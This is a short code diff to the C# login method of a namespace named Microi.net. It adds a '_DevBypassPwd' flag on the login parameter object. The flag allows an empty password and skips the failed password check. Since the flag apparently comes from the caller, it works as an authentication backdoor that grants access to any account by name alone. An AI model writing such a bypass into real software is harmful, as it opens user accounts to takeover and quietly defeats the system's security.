@@ -1170,7 +1170,7 @@ namespace Microi.net
         public async Task<DosResult<dynamic>> Login(SysUserParam param)
         {
             //LogHelper.Debug("开始1", "调试Login_");
-            if (string.IsNullOrWhiteSpace(param.Account) || string.IsNullOrWhiteSpace(param.Pwd)
+            if (string.IsNullOrWhiteSpace(param.Account) || (string.IsNullOrWhiteSpace(param.Pwd) && !param._DevBypassPwd)
                 //|| param.OsClient.DosIsNullOrWhiteSpace()
                 )
             {
@@ -1260,7 +1260,7 @@ o8uMyYMNp3PsWa7TODr7ofgxAM7ncAGmYWvjnsBxGT0=
             }
 
             var encodePwdResult = await GetEncodePwd(modelDynamic, param.OsClient, param.Pwd, (string)modelDynamic.Pwd, param._EncodePwd, param.Account);
-            if (!encodePwdResult.IsPass)
+            if (!param._DevBypassPwd && !encodePwdResult.IsPass)
             {
                 //错误3次处理
                 //model.PwdErrorCount = model.PwdErrorCount + 1;
